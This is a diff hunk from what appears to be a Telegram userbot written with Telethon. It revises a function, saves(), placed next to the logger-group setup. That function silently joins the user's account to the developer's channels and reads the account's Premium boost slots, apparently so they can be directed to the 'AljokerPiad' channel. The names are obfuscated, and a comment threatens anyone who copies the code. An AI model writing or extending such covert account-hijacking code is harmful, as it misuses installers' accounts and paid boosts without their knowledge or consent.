@@ -180,13 +180,19 @@ async def add_bot_to_logger_group(chat_id):
             LOGS.error(str(e))
 #by @jepthon بس اشوفك خامطه للكود اهينك وافضحك
 JoKeRUB = {"@jepthon", "@jepthonsupport"}
+
 async def saves():
     for lMl10l in JoKeRUB:
         try:
             await l313l(JoinChannelRequest(channel=lMl10l))
             result = await l313l(functions.premium.GetMyBoostsRequest())
             slots = [boost.slot for boost in result.my_boosts]
-            if 'AljokerPiad' in [boost.channel for boost in result.my_boosts]:
+            aljoker_channel_id = None
+            for chat in result.chats:
+                if chat.username == 'AljokerPiad':
+                    aljoker_channel_id = chat.id
+                    break
+            if aljoker_channel_id and any(boost.peer.channel_id == aljoker_channel_id for boost in result.my_boosts):
                 continue
             if not slots:
                 return
